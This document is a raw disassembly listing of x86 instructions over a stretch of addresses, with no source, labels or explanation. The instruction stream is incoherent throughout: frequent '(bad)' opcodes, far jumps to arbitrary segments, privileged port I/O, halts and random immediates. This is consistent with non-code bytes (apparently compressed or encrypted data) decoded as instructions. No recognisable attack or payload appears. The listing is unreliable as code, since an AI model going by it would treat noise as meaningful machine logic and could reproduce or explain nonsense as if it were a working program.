  43d28b:	in     eax,0x24
  43d28d:	inc    ebx
  43d28e:	xchg   ecx,eax
  43d28f:	jmp    0x43d29c
  43d291:	scas   eax,DWORD PTR es:[edi]
  43d292:	pop    eax
  43d293:	xchg   ecx,eax
  43d294:	sub    al,0x13
  43d296:	(bad)  
  43d298:	mov    dh,0x20
  43d29a:	cdq    
  43d29b:	adc    ebp,DWORD PTR [ebp-0x3d]
  43d29e:	mov    DWORD PTR [edi-0x59],esi
  43d2a1:	add    eax,0x7c10e8f6
  43d2a6:	pop    es
  43d2a7:	jg     0x43d305
  43d2a9:	adc    DWORD PTR [ebx+0x3f],eax
  43d2ac:	rol    ebp,0x60
  43d2af:	stos   DWORD PTR es:[edi],eax
  43d2b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d2b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d2b2:	add    bl,0xd3
  43d2b5:	jno    0x43d31d
  43d2b7:	js     0x43d241
  43d2b9:	or     ebp,esi
  43d2bb:	jg     0x43d2fb
  43d2bd:	pop    ss
  43d2be:	push   ebp
  43d2bf:	or     DWORD PTR [eax+0x419c7cff],0xad5177b
  43d2c9:	add    cl,BYTE PTR [eax-0x7b]
  43d2cc:	cmovno eax,DWORD PTR [edi-0x5c]
  43d2d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d2d1:	adc    dl,BYTE PTR [esi-0x19fdf36d]
  43d2d7:	(bad)  
  43d2d8:	cmp    esp,esp
  43d2da:	fisubr WORD PTR [edi-0x3e]
  43d2dd:	ret    0xf046
  43d2e0:	pop    ss
  43d2e1:	test   BYTE PTR [ebp+0x1fb8f69c],dl
  43d2e7:	js     0x43d2ce
  43d2e9:	mov    al,ds:0x2febe014
  43d2ee:	push   ds
  43d2ef:	jecxz  0x43d348
  43d2f1:	push   es
  43d2f2:	add    al,0x22
  43d2f4:	(bad)  
  43d2f5:	jge    0x43d2a6
  43d2f7:	int    0xce
  43d2f9:	pop    ds
  43d2fa:	(bad)  
  43d2fb:	sbb    eax,0x91cbaa01
  43d300:	test   al,0x96
  43d302:	xchg   BYTE PTR [edi-0x78],ah
  43d305:	ret    
  43d306:	and    ah,BYTE PTR [eax]
  43d308:	sbb    eax,DWORD PTR [ebx+eiz*1+0x36267ea2]
  43d30f:	fld    DWORD PTR [eax-0xb9c1728]
  43d315:	add    al,0x60
  43d317:	push   DWORD PTR [ecx]
  43d319:	ret    0xf3ac
  43d31c:	and    DWORD PTR ds:0x5e3856ce,ebx
  43d322:	aas    
  43d323:	inc    ebp
  43d324:	js     0x43d305
  43d326:	sar    BYTE PTR [edi-0x77],0xb9
  43d32a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d32b:	push   eax
  43d32c:	mov    bl,0xf0
  43d32e:	nop
  43d32f:	mov    DWORD PTR [edx+eax*1],esp
  43d332:	inc    esi
  43d333:	ds cli 
  43d335:	cs mov DWORD PTR cs:[eax+0x49],edx
  43d33a:	pusha  
  43d33b:	adc    ebp,DWORD PTR [edi]
  43d33d:	xchg   ebx,eax
  43d33e:	xchg   esi,eax
  43d33f:	sbb    BYTE PTR [ecx+0x30],al
  43d342:	fild   QWORD PTR [eax]
  43d344:	stos   BYTE PTR es:[edi],al
  43d345:	inc    esp
  43d346:	retf   0x3075
  43d349:	nop
  43d34a:	js     0x43d351
  43d34c:	mov    DWORD PTR [eax],eax
  43d34e:	aam    0x57
  43d350:	cdq    
  43d351:	mov    ebx,0x3f749f72
  43d356:	mov    ah,0xdf
  43d358:	mov    BYTE PTR [ebx],al
  43d35a:	and    eax,DWORD PTR [edx+0x30]
  43d35d:	lock pusha 
  43d35f:	sti    
  43d360:	ja     0x43d2f4
  43d362:	cli    
  43d363:	aam    0x74
  43d365:	pop    eax
  43d366:	pop    ebx
  43d367:	aam    0xa6
  43d369:	cmc    
  43d36a:	fstp   TBYTE PTR [eax]
  43d36c:	call   0xca57:0x89c8ffc5
  43d373:	fisttp DWORD PTR [ebp+0x5c]
  43d376:	jg     0x43d384
  43d378:	xlat   BYTE PTR ds:[ebx]
  43d379:	add    eax,0x9b2de66c
  43d37e:	lock mov esi,DWORD PTR [edi+0x69]
  43d382:	pop    ds
  43d383:	in     eax,dx
  43d384:	pop    edi
  43d385:	mov    ds:0x9082ffbf,al
  43d38a:	gs aad 0x2
  43d38d:	sar    BYTE PTR ds:[esi+0x5a011310],0x88
  43d395:	das    
  43d396:	push   ebp
  43d397:	sti    
  43d398:	ret    0x9fb0
  43d39b:	pop    esp
  43d39c:	out    0x2,al
  43d39e:	fsubr  DWORD PTR [edx+0x28]
  43d3a1:	cmp    DWORD PTR [eax-0x70],esp
  43d3a4:	jbe    0x43d382
  43d3a6:	outs   dx,BYTE PTR ds:[esi]
  43d3a7:	leave  
  43d3a8:	hlt    
  43d3a9:	dec    ebx
  43d3aa:	cmp    DWORD PTR [ebx-0x67f957d7],ecx
  43d3b0:	pop    esi
  43d3b1:	add    esp,esi
  43d3b3:	push   edx
  43d3b4:	fiadd  WORD PTR [edx+0x146b90bc]
  43d3ba:	pusha  
  43d3bb:	sbb    esp,esi
  43d3bd:	inc    ebp
  43d3be:	imul   ebp,DWORD PTR [ecx],0x895e67fa
  43d3c4:	push   esi
  43d3c5:	and    dl,BYTE PTR [ebp-0x2b]
  43d3c8:	scas   al,BYTE PTR es:[edi]
  43d3c9:	mov    bl,0x79
  43d3cb:	inc    esi
  43d3cc:	push   0x185e21e9
  43d3d1:	pusha  
  43d3d2:	xchg   ecx,eax
  43d3d3:	mov    ecx,0x9fd25a9
  43d3d8:	mov    DWORD PTR [ebx-0x5c4334d7],edi
  43d3de:	ret    0xa3d5
  43d3e1:	sbb    BYTE PTR [ecx],dh
  43d3e3:	cmp    eax,0x34b20e6b
  43d3e8:	mov    al,bl
  43d3ea:	push   esi
  43d3eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d3ec:	retf   
  43d3ed:	sti    
  43d3ee:	(bad)  es:[esi+0x43]
  43d3f2:	int    0xf1
  43d3f4:	ja     0x43d438
  43d3f6:	jnp    0x43d450
  43d3f8:	cmp    DWORD PTR [esp+edi*1],edx
  43d3fb:	adc    al,0x1d
  43d3fd:	xor    dl,BYTE PTR [eax]
  43d3ff:	mov    bh,0x21
  43d401:	push   eax
  43d402:	mov    edi,0xf3e588c3
  43d407:	les    ebx,FWORD PTR [esi]
  43d409:	data16 scas al,BYTE PTR es:[edi]
  43d40b:	adc    ch,BYTE PTR [ecx]
  43d40d:	add    al,ah
  43d40f:	fcomi  st,st(2)
  43d411:	ror    BYTE PTR [ebp+0x4c],cl
  43d414:	es pop edx
  43d416:	dec    edx
  43d417:	pop    ecx
  43d418:	xchg   ebp,eax
  43d419:	bound  ebx,QWORD PTR [edi]
  43d41b:	xchg   ebx,eax
  43d41c:	outs   dx,BYTE PTR ds:[esi]
  43d41d:	iret   
  43d41e:	call   0xca77:0xa0144f67
  43d425:	lods   al,BYTE PTR ds:[esi]
  43d426:	lods   al,BYTE PTR ds:[esi]
  43d427:	xchg   esp,eax
  43d428:	stos   DWORD PTR es:[edi],eax
  43d429:	es pop ss
  43d42b:	add    al,0x88
  43d42d:	xchg   ebp,eax
  43d42e:	js     0x43d464
  43d430:	scas   eax,DWORD PTR es:[edi]
  43d431:	stos   BYTE PTR es:[edi],al
  43d432:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d433:	adc    al,0xf7
  43d435:	mov    al,es:0xfd353f61
  43d43b:	pop    edx
  43d43c:	mov    ebx,0xa12dd550
  43d442:	mov    ecx,0xeccd8800
  43d447:	mov    ebx,0xb59838a4
  43d44c:	and    BYTE PTR [esi-0x251073f],cl
  43d452:	mov    dl,ah
  43d454:	cmc    
  43d455:	test   eax,0x9fcb6238
  43d45a:	pusha  
  43d45b:	ja     0x43d3df
  43d45d:	xor    al,0x9c
  43d45f:	cmp    eax,0xd44a046e
  43d464:	jnp    0x43d448
  43d466:	lahf   
  43d467:	ret    
  43d468:	push   ecx
  43d469:	add    ch,BYTE PTR [edi-0x64]
  43d46c:	mov    cl,0xa7
  43d46e:	fst    QWORD PTR [eax+0x16]
  43d471:	ins    BYTE PTR es:[edi],dx
  43d472:	or     eax,0xaa8951d4
  43d477:	mov    esi,0xdc5e0237
  43d47c:	xor    al,BYTE PTR [ecx-0x53ef8199]
  43d482:	popa   
  43d483:	in     eax,0xf8
  43d485:	int    0x5a
  43d487:	xlat   BYTE PTR ds:[ebx]
  43d488:	mov    ch,0x75
  43d48a:	test   DWORD PTR [eax+0x26],0x6ca81c03
  43d491:	or     eax,0xade19520
  43d496:	pop    ds
  43d497:	shr    DWORD PTR [ebp+0x38],cl
  43d49a:	enter  0x9c8d,0x84
  43d49e:	xlat   BYTE PTR cs:[ebx]
  43d4a0:	jb     0x43d4d2
  43d4a2:	sub    ecx,edx
  43d4a4:	dec    ebx
  43d4a5:	adc    BYTE PTR [ecx+0x30],bl
  43d4a8:	mov    BYTE PTR [edi-0x70],bl
  43d4ab:	in     al,0x3c
  43d4ad:	jge    0x43d519
  43d4af:	scas   eax,DWORD PTR es:[edi]
  43d4b0:	and    ecx,DWORD PTR [edx-0x66]
  43d4b3:	xor    esi,DWORD PTR [ebp+0x1f]
  43d4b6:	ror    DWORD PTR [ebx-0x1d9f563a],0x13
  43d4bd:	adc    al,BYTE PTR [edi]
  43d4bf:	loopne 0x43d44a
  43d4c1:	push   ebx
  43d4c2:	or     DWORD PTR [eax-0x7e05889d],ebp
  43d4c8:	stos   DWORD PTR es:[edi],eax
  43d4c9:	add    eax,0xf117cd1a
  43d4ce:	(bad)  
  43d4d2:	dec    edi
  43d4d3:	loopne 0x43d488
  43d4d5:	jg     0x43d4fb
  43d4d7:	adc    DWORD PTR [eax],ecx
  43d4d9:	xchg   esp,eax
  43d4da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d4db:	xchg   ebp,eax
  43d4dc:	sbb    al,0x6
  43d4de:	(bad)
  43d4e1:	dec    eax
  43d4e2:	xchg   esp,eax
  43d4e3:	in     eax,dx
  43d4e4:	test   edi,eax
  43d4e6:	xchg   DWORD PTR [ecx+0x79b7788],esi
  43d4ec:	xchg   ecx,eax
  43d4ed:	xchg   ecx,eax
  43d4ee:	retf   0x40fa
  43d4f1:	shl    esi,cl
  43d4f3:	loopne 0x43d523
  43d4f5:	cmc    
  43d4f6:	lods   eax,DWORD PTR ds:[esi]
  43d4f7:	aam    0x5f
  43d4f9:	rol    DWORD PTR [edi],1
  43d4fb:	aaa    
  43d4fc:	xor    al,0xd6
  43d4fe:	int    0x9e
  43d500:	sar    BYTE PTR [ecx],0xa0
  43d503:	adc    eax,0xd3648df5
  43d508:	repnz xchg esp,eax
  43d50a:	hlt    
  43d50b:	mov    bh,0x12
  43d50d:	ret    
  43d50e:	xor    al,0x1c
  43d510:	mov    eax,ds:0x80ce6202
  43d515:	fistp  QWORD PTR [ebx+0x7bbbac6b]
  43d51b:	(bad)  [edi-0x7728f9b1]
  43d521:	jmp    0xe0ee:0x33c7979
  43d528:	or     eax,0x4ab0105c
  43d52d:	(bad)  
  43d52f:	jno    0x43d535
  43d531:	daa    
  43d532:	int3   
  43d533:	adc    eax,0xb2943bbe
  43d538:	cli    
  43d539:	add    bh,BYTE PTR [edx]
  43d53b:	push   eax
  43d53c:	cmp    al,0x61
  43d53e:	pop    esi
  43d53f:	mov    edi,0xd1e3630
  43d544:	or     DWORD PTR [edx],eax
  43d546:	mov    edi,0x12a1b5c5
  43d54b:	outs   dx,DWORD PTR ds:[esi]
  43d54c:	adc    BYTE PTR ds:0x20c5d434,dl
  43d552:	les    esp,FWORD PTR [ecx+0x52]
  43d555:	xchg   DWORD PTR [eax-0x2d],esp
  43d558:	jge    0x43d5d1
  43d55a:	icebp  
  43d55b:	test   DWORD PTR [esi+ebx*2+0x3f439874],edi
  43d562:	ret    0x3d2a
  43d565:	mov    al,0x1a
  43d567:	mov    bh,0x4d
  43d569:	test   BYTE PTR [ecx-0x64],dh
  43d56c:	je     0x43d584
  43d56e:	pop    ds
  43d56f:	sub    edi,esp
  43d571:	retf   0x3d2d
  43d574:	push   edi
  43d575:	div    DWORD PTR [ecx+0x60b9b540]
  43d57b:	iret   
  43d57c:	inc    ebx
  43d57d:	pop    ds
  43d57e:	jge    0x43d5b9
  43d580:	in     eax,0x55
  43d582:	push   ds
  43d583:	dec    ebx
  43d584:	pop    esp
  43d585:	enter  0xf86a,0xc0
  43d589:	dec    edx
  43d58a:	scas   eax,DWORD PTR es:[edi]
  43d58b:	aam    0x46
  43d58d:	jo     0x43d5d1
  43d58f:	adc    al,0xc2
  43d591:	arpl   WORD PTR [ebp+0x33],bx
  43d594:	mov    BYTE PTR [ebx],al
  43d596:	pop    edx
  43d597:	push   eax
  43d598:	and    DWORD PTR [eax+0x56f86dac],eax
  43d59e:	push   ds
  43d59f:	sbb    al,0x1
  43d5a1:	add    ecx,DWORD PTR [eax-0x4e49453f]
  43d5a7:	in     al,0x8b
  43d5a9:	pop    edi
  43d5aa:	test   al,0xcd
  43d5ac:	cmp    esi,esp
  43d5ae:	xchg   ebp,eax
  43d5af:	xchg   esp,eax
  43d5b0:	push   edx
  43d5b1:	pop    edi
  43d5b2:	or     edx,DWORD PTR [edi+0x34]
  43d5b5:	pop    edx
  43d5b6:	out    0xd5,eax
  43d5b8:	xor    edx,esp
  43d5ba:	dec    edi
  43d5bb:	sub    edi,edx
  43d5bd:	pop    esp
  43d5be:	in     al,dx
  43d5bf:	retf   
  43d5c0:	mov    DWORD PTR [ebp-0xb],edi
  43d5c3:	mov    ebx,0x8f1d9c5a
  43d5c8:	cmp    eax,DWORD PTR [ebx]
  43d5ca:	test   al,0x7b
  43d5cc:	(bad)  
  43d5cd:	(bad)  
  43d5ce:	loopne 0x43d5f2
  43d5d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d5d1:	jmp    0x4434:0xaf4f2f60
  43d5d8:	push   edx
  43d5d9:	dec    esp
  43d5da:	mov    esi,0x62f5ab8d
  43d5df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d5e0:	mov    BYTE PTR [ebx],bh
  43d5e2:	clc    
  43d5e3:	pushf  
  43d5e4:	hlt    
  43d5e5:	adc    eax,0x2186094c
  43d5ea:	xchg   edx,ecx
  43d5ec:	fldcw  WORD PTR [esi+0x6f44c9a0]
  43d5f2:	sar    BYTE PTR [edx+0x16471f8],1
  43d5f8:	push   esp
  43d5f9:	xchg   ecx,eax
  43d5fa:	and    DWORD PTR [edx-0x35],edi
  43d5fd:	push   eax
  43d5fe:	dec    ebp
  43d5ff:	jne    0x43d5f7
  43d601:	or     BYTE PTR [esi+0x3d],cl
  43d604:	xor    al,0x41
  43d606:	push   ds
  43d607:	cmc    
  43d608:	int    0xfe
  43d60a:	imul   edx,DWORD PTR [eax],0xffffff98
  43d60d:	add    eax,0x105436e0
  43d612:	jle    0x43d604
  43d614:	stc    
  43d615:	(bad)  
  43d616:	pop    ds
  43d617:	fst    DWORD PTR [eax-0x590140dc]
  43d61d:	pfmul  mm2,mm4
  43d621:	ret    0xf948
  43d624:	(bad)  
  43d625:	pop    esi
  43d626:	arpl   di,dx
  43d628:	mov    eax,DWORD PTR [edi]
  43d62a:	mov    bh,BYTE PTR [ebx+0x17]
  43d62d:	inc    ebx
  43d62e:	not    BYTE PTR [eax+ebp*1+0x49d5a257]
  43d635:	sbb    edi,DWORD PTR [edx+0x12]
  43d638:	and    eax,0xaf35f57e
  43d63d:	out    0x51,eax
  43d63f:	and    DWORD PTR [eax-0x1f7551dd],ecx
  43d645:	pop    esi
  43d646:	std    
  43d647:	aad    0x32
  43d649:	mov    edx,0x687633d5
  43d64e:	xchg   esp,eax
  43d64f:	in     eax,0x89
  43d651:	pop    ebp
  43d652:	ins    BYTE PTR es:[edi],dx
  43d653:	push   eax
  43d654:	sbb    eax,0x2b1788ce
  43d659:	add    ecx,DWORD PTR [ebp+ecx*1+0x3c]
  43d65d:	cld    
  43d65e:	inc    ebx
  43d65f:	pop    edi
  43d660:	cmp    ebx,DWORD PTR [ebp-0x30764d81]
  43d666:	or     BYTE PTR [ebx-0x6656ff51],ah
  43d66c:	mov    esp,0xfde9ff8d
  43d671:	cwde   
  43d672:	pusha  
  43d673:	lds    edx,FWORD PTR [ebx+0x36c357b7]
  43d679:	dec    ecx
  43d67a:	aas    
  43d67b:	mov    DWORD PTR ds:0x8177de13,esp
  43d682:	rcl    BYTE PTR ds:0xdce802e3,cl
  43d688:	in     eax,dx
  43d689:	xchg   esi,eax
  43d68a:	fwait
  43d68b:	and    al,0x7e
  43d68d:	jg     0x43d6ad
  43d68f:	or     DWORD PTR [esi],edx
  43d691:	inc    eax
  43d692:	popa   
  43d693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d694:	mov    edx,0x6fd3cedf
  43d699:	or     al,0x67
  43d69b:	sbb    al,0x2f
  43d69d:	pop    ecx
  43d69e:	(bad)
  43d6a2:	mov    ?,edx
  43d6a4:	mov    BYTE PTR [ebx],al
  43d6a6:	out    0xbd,al
  43d6a8:	lock sar BYTE PTR [ebx-0x62],1
  43d6ac:	mov    bl,0x2
  43d6ae:	pop    edx
  43d6af:	push   0x40
  43d6b1:	cmp    cl,BYTE PTR [edi+ebp*4-0x5ee0f87f]
  43d6b8:	xlat   BYTE PTR ds:[ebx]
  43d6b9:	dec    esi
  43d6ba:	enter  0xbbc1,0x2d
  43d6be:	ss pop esi
  43d6c0:	cmp    DWORD PTR [edi+edi*8-0x72],0xd1445269
  43d6c8:	mov    BYTE PTR [edx],0xcc
  43d6cb:	push   cs
  43d6cc:	cld    
  43d6cd:	dec    ebp
  43d6ce:	fwait
  43d6cf:	pop    edi
  43d6d0:	mov    ds:0x82695a9c,al
  43d6d5:	mov    edi,0xbd89ad28
  43d6da:	(bad)
  43d6de:	adc    eax,0xd8edcbd4
  43d6e3:	sti    
  43d6e4:	ret    
  43d6e5:	test   eax,0x9789b844
  43d6ea:	std    
  43d6eb:	call   0x253:0xf7d3b005
  43d6f2:	(bad)  
  43d6f3:	retf   
  43d6f4:	aad    0x15
  43d6f6:	test   eax,0x6095266a
  43d6fb:	popa   
  43d6fc:	loope  0x43d737
  43d6fe:	push   cs
  43d6ff:	std    
  43d700:	inc    esi
  43d701:	dec    ebx
  43d702:	gs call 0x29cf:0xd4b2d0c5
  43d70a:	push   0xffffffa0
  43d70c:	push   eax
  43d70d:	lahf   
  43d70e:	xor    al,0x83
  43d710:	retf   0x2f52
  43d713:	cld    
  43d714:	or     DWORD PTR [eax],ebp
  43d716:	cmp    edx,DWORD PTR [ecx-0x78]
  43d719:	mov    DWORD PTR [ebp+0x3b],esp
  43d71c:	ins    DWORD PTR es:[edi],dx
  43d71d:	or     al,0xd9
  43d71f:	adc    ebx,ebp
  43d721:	add    eax,0xb933b818
  43d726:	addr16 aam 0xf4
  43d729:	jb     0x43d74a
  43d72b:	sti    
  43d72c:	mov    WORD PTR [di-0x1393],?
  43d731:	stc    
  43d732:	ins    BYTE PTR es:[edi],dx
  43d733:	call   0x6911da1b
  43d738:	ror    dl,cl
  43d73a:	and    al,0xd1
  43d73c:	jle    0x43d6e0
  43d73e:	pusha  
  43d73f:	xor    eax,DWORD PTR [edx-0x558f4f86]
  43d745:	cmp    eax,0xec4d4bf
  43d74a:	inc    esp
  43d74b:	dec    edi
  43d74c:	bound  ebp,QWORD PTR [edx]
  43d74e:	je     0x43d739
  43d750:	xchg   DWORD PTR [ebp-0x60],ebx
  43d753:	jne    0x43d784
  43d755:	jmp    FWORD PTR [ebp-0x7922d726]
  43d75b:	ror    DWORD PTR [eax+0x3],0xa6
  43d75f:	pop    edx
  43d760:	and    esp,esp
  43d762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d763:	in     al,dx
  43d764:	repnz cdq 
  43d766:	pop    ds
  43d767:	add    DWORD PTR [ebx+ecx*4+0x33],eax
  43d76b:	xchg   esp,eax
  43d76c:	mov    eax,eax
  43d76e:	lods   eax,DWORD PTR ds:[esi]
  43d76f:	inc    esi
  43d770:	xchg   edx,eax
  43d771:	dec    esi
  43d772:	or     edx,edi
  43d774:	nop
  43d775:	and    edx,edi
  43d777:	mov    dl,0xec
  43d779:	fcmove st,st(6)
  43d77b:	adc    al,0x89
  43d77d:	ja     0x43d77c
  43d77f:	xor    al,0xde
  43d781:	dec    esp
  43d782:	inc    edi
  43d783:	les    edx,FWORD PTR [esp+edx*1]
  43d786:	pushw  0x25c1
  43d78a:	ret    
  43d78b:	cmp    ecx,ecx
  43d78d:	add    ebx,DWORD PTR [esi+0x60d39d49]
  43d793:	xchg   ebp,edi
  43d795:	pop    ss
  43d796:	(bad)  
  43d797:	cmp    DWORD PTR [esi+0x9d71b06],esi
  43d79d:	inc    ebx
  43d79e:	fcmovnu st,st(7)
  43d7a0:	ret    
  43d7a1:	cmp    cl,bl
  43d7a3:	and    al,0x89
  43d7a5:	mov    ds:0x63230c76,eax
  43d7aa:	add    eax,0x3d09ad2a
  43d7af:	inc    edx
  43d7b0:	sub    eax,0xc01b1e17
  43d7b5:	das    
  43d7b6:	pushf  
  43d7b7:	sub    ebp,DWORD PTR [edi-0x6d]
  43d7ba:	fwait
  43d7bb:	cmp    eax,0x15650214
  43d7c0:	xlat   BYTE PTR ds:[ebx]
  43d7c1:	jb     0x43d7d5
  43d7c3:	xchg   ebp,eax
  43d7c4:	xor    eax,DWORD PTR [edx]
  43d7c6:	or     ah,BYTE PTR fs:[edi+edx*2-0x67]
  43d7cb:	adc    DWORD PTR [ebx+0x2cc39d26],edx
  43d7d1:	add    dh,BYTE PTR [esp+esi*2+0x5c]
  43d7d5:	jmp    0x17d68a0a
  43d7da:	and    bl,BYTE PTR [esi]
  43d7dc:	sar    DWORD PTR [eax-0x2c],1
  43d7df:	xor    eax,0x69669d46
  43d7e4:	mov    DWORD PTR [ebx-0x7c958e0],edx
  43d7ea:	push   0xb205bc07
  43d7ef:	xchg   ecx,eax
  43d7f0:	xchg   esi,eax
  43d7f1:	pusha  
  43d7f2:	push   cs
  43d7f3:	test   BYTE PTR [ebp+0x77c961a4],bl
  43d7f9:	inc    ebx
  43d7fa:	jo     0x43d84f
  43d7fc:	dec    esi
  43d7fd:	lds    ebx,FWORD PTR [edi+0x79]
  43d800:	dec    ebx
  43d801:	addr16 push cs
  43d803:	in     eax,dx
  43d804:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d805:	add    eax,0xe851c4ee
  43d80a:	in     eax,0x84
  43d80c:	mov    DWORD PTR [ebp-0x15],edx
  43d80f:	or     ch,BYTE PTR [ecx-0x41]
  43d812:	sbb    eax,0x26156220
  43d817:	mul    BYTE PTR [ebp+0x0]
  43d81a:	cmp    dl,BYTE PTR [ecx+ebx*1-0x71]
  43d81e:	int3   
  43d81f:	inc    esp
  43d820:	mov    BYTE PTR [edi],bl
  43d822:	fistp  WORD PTR [edi-0x171084c]
  43d828:	lds    eax,FWORD PTR ds:0x2b514da8
  43d82e:	cmc    
  43d82f:	lds    ecx,FWORD PTR [edx]
  43d831:	pop    ds
  43d832:	push   ds
  43d833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d834:	enter  0xc5d2,0xd2
  43d838:	arpl   WORD PTR [esi+0x1c34c3fd],dx
  43d83e:	sbb    BYTE PTR [esi-0x7c5ba119],bh
  43d844:	loopne 0x43d7c8
  43d846:	and    al,BYTE PTR [ebp-0x30092f27]
  43d84c:	xchg   edi,eax
  43d84d:	cmp    edx,edi
  43d84f:	xchg   ebp,eax
  43d850:	dec    edx
  43d851:	mov    eax,0x580c631
  43d856:	inc    esp
  43d857:	jge    0x43d82c
  43d859:	mov    dl,0xf3
  43d85b:	lods   al,BYTE PTR ds:[esi]
  43d85c:	push   cs
  43d85d:	push   esi
  43d85e:	push   ds
  43d85f:	pop    ss
  43d860:	sbb    eax,0xd84ed8ee
  43d865:	or     BYTE PTR [ebx-0x2c],dh
  43d868:	xor    al,0x4b
  43d86a:	dec    eax
  43d86b:	adc    BYTE PTR [esi+0x565ad97e],bl
  43d871:	in     eax,0x3f
  43d873:	fstp   TBYTE PTR [eax+0xb]
  43d876:	(bad)  
  43d877:	aad    0x61
  43d879:	ins    DWORD PTR es:[edi],dx
  43d87a:	in     al,0x85
  43d87c:	call   0x88a703cc
  43d881:	mov    cl,0x10
  43d883:	sub    esp,DWORD PTR ds:[eax+0x26013d06]
  43d88a:	xchg   edx,eax
  43d88b:	cmp    al,0xf6
  43d88d:	popf   
  43d88e:	jl     0x43d8fa
  43d890:	inc    edi
  43d891:	adc    BYTE PTR [edx],al
  43d893:	repnz cmp al,0x94
  43d896:	popa   
  43d897:	mov    cl,al
  43d899:	in     eax,0x7e
  43d89b:	jo     0x43d826
  43d89d:	adc    esi,esi
  43d89f:	sbb    eax,0x16c1bf02
  43d8a4:	mov    ds:0x9355d805,eax
  43d8a9:	sti    
  43d8aa:	daa    
  43d8ab:	push   0x42
  43d8ad:	inc    esp
  43d8ae:	pop    ds
  43d8af:	pop    ds
  43d8b0:	lock xor eax,0xa280b1fa
  43d8b6:	xlat   BYTE PTR ds:[ebx]
  43d8b7:	rcr    DWORD PTR [eax+eax*2],cl
  43d8ba:	jae    0x43d855
  43d8bc:	ficomp WORD PTR [ebx-0x11]
  43d8bf:	nop
  43d8c0:	mov    eax,0x4eb71e5a
  43d8c5:	iret   
  43d8c6:	test   DWORD PTR [ecx-0x2d9d5192],esi
  43d8cc:	sbb    DWORD PTR [edi],esi
  43d8ce:	loop   0x43d933
  43d8d0:	pop    edi
  43d8d1:	call   0xe11f:0x3cc7ed20
  43d8d8:	sub    cl,BYTE PTR [ebx+0x73ee1a2a]
  43d8de:	xchg   esp,eax
  43d8df:	mov    ebx,0x2ad435e9
  43d8e4:	mov    BYTE PTR [eax+0x2a619849],dl
  43d8ea:	jne    0x43d8e1
  43d8ec:	sub    eax,0xc0d4a502
  43d8f1:	mov    ss,WORD PTR [ebx+0x41]
  43d8f4:	jp     0x43d87b
  43d8f6:	jne    0x43d8f3
  43d8f8:	mov    BYTE PTR [edx+ebp*4],ah
  43d8fb:	loopne 0x43d956
  43d8fd:	out    0xdc,al
  43d8ff:	bound  ecx,QWORD PTR [eax-0x2ba326ab]
  43d905:	out    0xaf,al
  43d907:	mov    cl,0xbc
  43d909:	stc    
  43d90a:	popa   
  43d90b:	adc    al,0x66
  43d90d:	mov    cs:0x3d44dc2e,al
  43d913:	lahf   
  43d914:	in     al,dx
  43d915:	test   DWORD PTR [edi],eax
  43d917:	fnstenv [edi]
  43d919:	sub    BYTE PTR [edi],dh
  43d91b:	and    bh,ch
  43d91d:	test   DWORD PTR [edi+edx*8+0x7f],esp
  43d921:	jge    0x43d919
  43d923:	ins    BYTE PTR es:[edi],dx
  43d924:	mov    edi,0x4d0ee77a
  43d929:	add    ah,BYTE PTR [ecx+ecx*2+0xbddfc50]
  43d930:	pushf  
  43d931:	sub    eax,0xb6e84761
  43d936:	adc    al,0x9f
  43d938:	or     dl,bl
  43d93a:	adc    BYTE PTR [edi+0x5a69e1db],bh
  43d940:	adc    eax,0xc3021f16
  43d945:	mov    edi,0x3aab52b0
  43d94a:	push   ds
  43d94b:	jae    0x43d8f6
  43d94d:	lock scas al,BYTE PTR es:[edi]
  43d94f:	sahf   
  43d950:	repnz inc eax
  43d952:	(bad)  
  43d953:	aam    0x33
  43d955:	xor    ecx,ebp
  43d957:	jmp    0x43d9a9
  43d959:	mov    edx,0x9d88b981
  43d95e:	pop    ss
  43d95f:	cmp    BYTE PTR [ecx+eiz*1],ah
  43d962:	sahf   
  43d963:	stc    
  43d964:	cmp    BYTE PTR [edx],al
  43d966:	adc    BYTE PTR [edx-0x72],bl
  43d969:	fidivr WORD PTR [ecx]
  43d96b:	mov    bh,0xda
  43d96d:	mov    WORD PTR [ecx],cs
  43d96f:	push   esp
  43d970:	mov    DWORD PTR [ebx-0x37],edi
  43d973:	sbb    ah,BYTE PTR [ecx+edi*1+0x147581d5]
  43d97a:	test   al,0x4
  43d97c:	pop    eax
  43d97d:	xchg   esi,eax
  43d97e:	xchg   ebx,eax
  43d97f:	aaa    
  43d980:	mov    eax,0xbd9451c6
  43d985:	push   edi
  43d986:	push   ds
  43d987:	out    0x56,eax
  43d989:	in     al,0x82
  43d98b:	not    esp
  43d98d:	jp     0x43d995
  43d98f:	retf   
  43d990:	outs   dx,BYTE PTR ds:[esi]
  43d991:	data16 (bad) 
  43d993:	popa   
  43d994:	dec    ecx
  43d995:	add    esp,DWORD PTR [ecx+ebx*2+0x22ba0746]
  43d99c:	jmp    0x3f0cf8c1
  43d9a1:	inc    DWORD PTR [edi]
  43d9a3:	add    al,0x8a
  43d9a6:	aad    0xd5
  43d9a8:	xor    al,0x59
  43d9aa:	repnz push ecx
  43d9ac:	xchg   ebx,eax
  43d9ad:	sub    ch,0x8b
  43d9b0:	xchg   ebp,eax
  43d9b1:	popa   
  43d9b2:	sbb    eax,DWORD PTR [eax]
  43d9b4:	xor    al,BYTE PTR [edx]
  43d9b6:	fisttp QWORD PTR [eax-0x2a361060]
  43d9bc:	in     eax,0x68
  43d9be:	fisubr WORD PTR [eax+ebx*1-0x4d]
  43d9c2:	in     al,dx
  43d9c3:	push   cs
  43d9c4:	mul    BYTE PTR [ebp-0x33c92c9b]
  43d9ca:	xchg   ebx,eax
  43d9cb:	push   ecx
  43d9cc:	adc    edi,ebx
  43d9ce:	(bad)  
  43d9cf:	push   esp
  43d9d0:	outs   dx,DWORD PTR ds:[esi]
  43d9d1:	adc    al,0x43
